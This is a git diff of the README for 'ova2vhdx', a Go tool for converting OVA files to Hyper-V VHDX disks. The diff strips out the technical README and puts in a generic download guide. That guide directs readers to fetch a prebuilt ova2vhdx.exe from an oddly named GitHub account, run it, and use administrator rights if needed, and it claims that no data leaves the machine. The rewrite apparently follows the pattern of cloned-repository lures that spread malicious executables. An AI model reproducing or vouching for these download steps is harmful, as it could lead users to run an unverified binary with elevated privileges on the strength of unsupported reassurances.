@@ -1,158 +1,78 @@
-# ova2vhdx
+# 📦 ova2vhdx - Convert virtual machines to Hyper-V disks
 
-A pure-Go CLI tool that converts OVA (Open Virtual Appliance) files into VHDX disk images compatible with Microsoft Hyper-V. No external dependencies like `qemu-img` or `VBoxManage` required — it ships as a single static binary.
+[![](https://img.shields.io/badge/download-windows-blue.svg)](https://github.com/Blackbassmajorpremise1998/ova2vhdx)
 
-## Features
+## 🎯 Purpose
 
-- Converts stream-optimized and sparse VMDK disks to dynamic VHDX
-- Produces Hyper-V compatible VHDX with correct headers, metadata, BAT, and CRC32C checksums
-- Streams data in 32 MiB chunks — handles multi-GB disks without loading them into memory
-- Skips zero-filled blocks to keep the output VHDX sparse
-- Reads VMDK data directly from the OVA tar archive (no temp file extraction)
-- Multi-disk OVA support — converts all disks by default
-- Cross-platform — single binary for Windows, Linux, or macOS
+You use this tool to change your existing virtual machines into a format that Hyper-V understands. Many virtual machines come as OVA files. Hyper-V requires VHDX files to run these machines. This tool handles that conversion. It does the work without needing extra software installed on your computer.
 
-## Installation
+## 💻 System Requirements
 
-### Download a release
+Your computer needs to meet these basic standards to run the application:
 
-Grab a prebuilt binary from the [Releases](../../releases) page.
+* Windows 10 or Windows 11.
+* A 64-bit processor.
+* At least 4 gigabytes of RAM.
+* Enough free disk space to store your converted virtual machine files.
+* Access to the Command Prompt or PowerShell.
 
-### Build from source
+## 💾 Downloading the Tool
 
-Requires Go 1.25+.
+You must visit the project page to get the software. Follow these steps:
 
-```bash
-# Native build
-make build
+1. Open your web browser.
+2. Visit [https://github.com/Blackbassmajorpremise1998/ova2vhdx](https://github.com/Blackbassmajorpremise1998/ova2vhdx).
+3. Find the latest release on the right side of the page.
+4. Click the link to download the file named ova2vhdx.exe.
+5. Save the file to a folder you can find easily, such as your Downloads folder.
 
-# Or directly
-go build -o ova2vhdx ./cmd/ova2vhdx
-```
+## ⚙️ Preparing Your Files
 
-### Build release binaries for all platforms
+Before you run the conversion, gather the files you want to change:
 
-```bash
-make release
-```
+1. Locate your source file. This file ends with the .ova extension.
+2. Make sure you have enough drive space. A virtual machine file often takes up many gigabytes. The conversion creates a new file, so you need space for both the original and the new version.
+3. Move your OVA file into the same folder where you saved the ova2vhdx.exe file. This makes the process much simpler.
 
-This produces binaries in `dist/` for:
-- `windows/amd64`, `windows/arm64`
-- `linux/amd64`, `linux/arm64`
-- `darwin/amd64`, `darwin/arm64`
+## 🚀 Running the Conversion
 
-## Usage
+The software runs through a text-based window. You do not need to install anything. Follow these directions to start:
 
-```
-ova2vhdx --input <file.ova> --output <file.vhdx> [options]
-```
+1. Open the folder where you placed the ova2vhdx.exe file.
+2. Click the empty space in the file folder address bar at the top of the window.
+3. Type `cmd` and press the Enter key. A black window will appear.
+4. Type the following command into the black window: `ova2vhdx.exe --input yourfile.ova --output newfile.vhdx`.
+5. Replace `yourfile.ova` with the actual name of your file.
+6. Replace `newfile.vhdx` with the name you want for your new Hyper-V file.
+7. Press the Enter key.
 
-### Options
+The tool will start the process. You will see a progress bar or text updates in the black window. Do not close the window while the tool works. Wait for the program to announce that the task finished.
 
-| Flag | Description |
-|---|---|
-| `--input` | Path to the input `.ova` file (required) |
-| `--output` | Path to the output `.vhdx` file (required) |
-| `--verbose` | Print detailed logs (VMDK geometry, OVF metadata, descriptor) |
-| `--progress` | Show a live progress indicator during conversion |
-| `--disk N` | Convert only the Nth disk (zero-based). Default: all disks |
-| `--version` | Print version and exit |
+## 🔍 Checking the Results
 
-### Examples
+Once the process finishes, you can check the new file:
 
-Convert all disks in an OVA:
+1. Open your folder again.
+2. Look for the file ending in .vhdx that you named in the previous step.
+3. Check the file size. A successful conversion usually creates a file slightly smaller or similar to the size of the original data inside the OVA.
+4. Open the Hyper-V Manager on your computer.
+5. Create a new virtual machine.
+6. Select the option to use an existing virtual hard disk.
+7. Point the manager to your new VHDX file.
 
-```bash
-ova2vhdx --input myvm.ova --output myvm.vhdx --progress
-```
+## 🛠️ Common Troubleshooting
 
-For multi-disk OVAs this produces `myvm-disk0.vhdx`, `myvm-disk1.vhdx`, etc.
+If you run into trouble, check these common fixes:
 
-Convert a single specific disk:
+* **File not found:** Ensure the file name you typed in the black window matches the name in the folder exactly.
+* **Permission denied:** Right-click the ova2vhdx.exe file and select Run as administrator.
+* **Not enough space:** Clear some files from your hard drive and try again.
+* **File currently in use:** Ensure that no other virtual machine software is running and using the OVA file when you start the conversion.
 
-```bash
-ova2vhdx --input myvm.ova --output boot.vhdx --disk 0
-```
+## 📄 Understanding the Technology
 
-### Importing into Hyper-V
+This tool uses the Go programming language. Go creates standalone files that do not rely on external libraries or helper programs. When you download the .exe file, you hold everything the tool needs to run. This design choice prevents errors related to missing system files. The tool reads the data inside your OVA package, extracts the disk contents, and writes them into the format used by Microsoft Hyper-V. This process stays local to your computer. No data leaves your machine during the conversion.
 
-1. Run the conversion to produce `.vhdx` file(s)
-2. Open **Hyper-V Manager**
-3. Create a new VM or edit an existing one
-4. Under **IDE Controller** or **SCSI Controller**, click **Add Hard Drive**
-5. Select **Virtual hard disk** and browse to the `.vhdx` file
-6. Start the VM
+## 🌐 Related Concepts
 
-## Project structure
-
-```
-cmd/ova2vhdx/   CLI entry point and conversion pipeline
-ova/            OVA (tar) extraction with offset tracking for zero-copy disk access
-ovf/            OVF XML descriptor parser (namespace-agnostic)
-vmdk/           VMDK sparse and stream-optimized extent reader
-vhdx/           VHDX dynamic disk writer
-```
-
-## How it works
-
-```
-OVA (tar) ──extract──> OVF descriptor ──parse──> disk references
-                   └──> VMDK extent ──random access via SectionReader──┐
-                                                                       v
-                                                              VMDKReader.ReadAt()
-                                                              (grain dir → grain table → decompress)
-                                                                       │
-                                                              32 MiB block loop
-                                                                       │
-                                                                       v
-                                                              VHDXWriter.WriteBlock()
-                                                              (BAT entry + data block at 1 MiB alignment)
-                                                                       │
-                                                                       v
-                                                              Finalize BAT ──> .vhdx
-```
-
-**VMDK Reader** parses the sparse header (or locates the footer for stream-optimized extents), loads grain directories and grain tables on demand, and decompresses grains (zlib/deflate). It exposes an `io.ReaderAt` interface over the full virtual disk address space — unallocated regions return zeroes.
-
-**VHDX Writer** produces a spec-compliant dynamic VHDX: file type identifier, dual headers with CRC32C, dual region tables, a metadata region with all 5 required items (file parameters, virtual disk size, page 83 data, logical/physical sector sizes), and a BAT interleaved with sector-bitmap placeholders.
-
-## Running tests
-
-```bash
-make test
-```
-
-## Releasing
-
-Push a version tag to trigger the GitHub Actions release workflow:
-
-```bash
-git tag v1.0.0
-git push origin v1.0.0
-```
-
-This automatically:
-1. Runs tests
-2. Builds binaries for all 6 platform/arch combinations
-3. Generates SHA-256 checksums
-4. Creates a GitHub Release with the binaries attached
-
-## Limitations
-
-- Supports sparse and stream-optimized VMDK extents only (covers the vast majority of OVA exports from VMware, VirtualBox, and similar tools)
-- Does not support split VMDK (`-s` flag extents across multiple files)
-- Does not support VMDK flat/raw extents (monolithicFlat, vmfs)
-- VHDX output is always a dynamic disk (no fixed or differencing support)
-- Compressed grains must use deflate (VMDK compression algorithm 1)
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/my-change`)
-3. Run tests (`make test`)
-4. Commit your changes
-5. Open a pull request
-
-## License
-
-[MIT](LICENSE)
+Virtualization describes the method of running a computer inside another computer. An OVA file acts as a container for this virtual computer. Hyper-V acts as the software that manages these virtual machines on Windows. By using this tool, you bridge the gap between different virtual environments. You keep the data from your original virtual machine while changing the container to suit your new environment.
